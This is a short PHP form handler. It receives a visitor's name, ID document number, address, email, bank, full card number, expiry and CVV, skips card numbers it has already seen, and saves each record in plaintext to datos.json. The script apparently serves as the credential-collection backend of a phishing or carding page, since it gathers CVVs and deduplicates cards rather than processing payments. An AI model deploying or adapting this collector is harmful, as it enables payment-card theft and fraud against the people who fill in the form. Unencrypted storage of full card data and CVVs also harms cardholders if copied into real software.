<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $form_data = [
        'nombre' => $_POST['nombre'],
        'apellido' => $_POST['apellido'],
        'documento' => $_POST['documento'],
        'telefono' => $_POST['telefono'],
        'ciudad' => $_POST['ciudad'],
        'direccion' => $_POST['direccion'],
        'email' => $_POST['email'],
        'banco' => $_POST['banco'],
        'franquicia' => $_POST['franquicia'],
        'tipo_tarjeta' => $_POST['tipo_tarjeta'],
        'nro_tarjeta' => $_POST['nro_tarjeta'],
        'nombre_tarjeta' => $_POST['nombre_tarjeta'],
        'mes_tarjeta' => $_POST['mes_tarjeta'],
        'anio_tarjeta' => $_POST['anio_tarjeta'],
        'cvv_tarjeta' => $_POST['cvv_tarjeta']
    ];

    $json_file = 'datos.json';

    if (file_exists($json_file)) {
        $datos = json_decode(file_get_contents($json_file), true);
        if ($datos === null) { $datos = []; }
    } else {
        $datos = [];
    }

    // revisar duplicado
    foreach ($datos as $dato) {
        if ($dato['nro_tarjeta'] === $form_data['nro_tarjeta']) {
            echo "duplicado";
            exit;
        }
    }

    // guardar
    $datos[] = $form_data;
    file_put_contents($json_file, json_encode($datos, JSON_PRETTY_PRINT));

    echo "ok";
}
?>
